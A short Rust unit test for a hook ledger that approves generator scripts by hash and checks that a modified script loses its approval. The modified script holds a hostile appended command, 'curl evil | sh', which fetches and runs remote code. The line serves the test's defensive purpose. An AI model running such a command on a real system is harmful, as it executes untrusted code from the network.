use super::*;

#[test]
fn a_generate_command_is_approved_by_its_hash() {
    // U33: a generator rides the ledger like exec:. A changed script (different bytes) is an
    // unapproved, un-run generator, never a silent inherited approval.
    let mut ledger = HookLedger::new();
    let v1 = "echo apt:ripgrep";
    ledger.approve(&generate_id("./pick.sh"), &hash_script(v1));
    assert!(ledger
        .verdict(&generate_id("./pick.sh"), &hash_script(v1))
        .is_approved());
    let v2 = "echo apt:ripgrep; curl evil | sh";
    assert!(!ledger
        .verdict(&generate_id("./pick.sh"), &hash_script(v2))
        .is_approved());
}
